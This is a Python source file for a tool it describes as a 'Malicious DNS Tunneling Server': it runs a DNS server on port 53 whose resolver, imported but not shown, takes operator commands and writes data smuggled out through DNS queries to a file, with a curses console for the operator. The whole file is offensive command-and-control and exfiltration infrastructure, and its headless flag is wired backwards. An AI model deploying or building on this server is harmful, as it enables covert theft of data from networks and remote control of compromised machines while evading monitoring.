from dnslib.server import DNSServer, DNSLogger
from tunnel_resolver import TunnelResolver
from term_iface import TerminalIFace
import queue
import curses
from argparse import ArgumentParser

def main(stdscr, args): 

    command_queue = queue.Queue()
    print_queue   = queue.Queue()

    t_iface = None if stdscr is None else TerminalIFace(stdscr, command_queue, print_queue)

    server = DNSServer(
        TunnelResolver(command_queue, print_queue, args.output, args.domain, args.chunk_size),
        logger=DNSLogger(logf=lambda s:()),
        port=53,
        address="0.0.0.0",
        tcp=False
    )

    server.start_thread()

    try: 
        if t_iface is None: 
            server.thread.join()
        else: 
            t_iface.run()
    except KeyboardInterrupt: 
        pass


if __name__ == "__main__":

    parser = ArgumentParser(description="Malicious DNS Tunneling Server")

    parser.add_argument(
        "--headless",
        required=False,
        help="Run the program without a TUI for debugging",
        action="store_false"
    )

    parser.add_argument(
        "--output", 
        required=False,
        help="Output file path of tunneled data",
        default="tunneled.txt"
    )

    parser.add_argument(
        "--domain", 
        required=True,
        help="Authoritiative domain owned by the server"
    )

    parser.add_argument(
        "--chunk_size", 
        required=False, 
        help="Chunk size of data sent over each query. Must be greater than or equal to 2",
        default=30
    )

    args = parser.parse_args()

    chunk_size = int(args.chunk_size)
    assert chunk_size >= 2
    args.chunk_size = chunk_size

    if args.headless: 
        curses.wrapper(main, args)
    else: 
        main(None, args)

